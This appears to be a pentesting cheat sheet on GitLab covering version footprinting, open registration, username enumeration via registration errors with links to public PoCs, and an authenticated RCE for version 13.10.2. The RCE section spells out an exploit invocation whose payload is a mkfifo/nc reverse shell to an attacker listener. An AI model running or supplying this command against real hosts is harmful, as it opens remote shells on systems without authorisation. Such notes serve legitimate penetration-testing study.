# Gitlab

## **Introduction**

> * GitLab is an open source end-to-end software development platform with built-in version control, issue tracking, code review, CI/CD, and more.
> * There's not much we can do against GitLab without knowing the version number or being logged in.
> * In some cases, you can register a user accoun without admin confirmation

***

## **GitLab Footprinting & Enumeration**

* There's not much we can do against GitLab without knowing the version number or being logged in.
* The only way to footprint the GitLab `version number` in use is by browsing to the `/help` page when logged in.
* Some GitLab istances may `allow user registration` without confirmation from an administrator
* Authenticated: browsing to `/explore` we can check for any `public projects` that may contain something interesting

***

## **GitLab User Enumeration**

* We can enumerate valid (used) usernames by using the registration form error messages
* Resources (PoCs for enumerating users):
  * [https://www.exploit-db.com/exploits/49821](https://www.exploit-db.com/exploits/49821)
  * [https://github.com/dpgg101/GitLabUserEnum](https://github.com/dpgg101/GitLabUserEnum)

***

## **GitLab Authenticated RCE**

* **Affected version:** `13.10.2`
* **Exploit:** [https://www.exploit-db.com/exploits/49951](https://www.exploit-db.com/exploits/49951)
* **PoC Usage:**\
  `python3 gitlab_13_10_2_rce.py -t http://gitlab.test.example:8081 -u user -p password -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc your-ip your-nc-port >/tmp/f '`
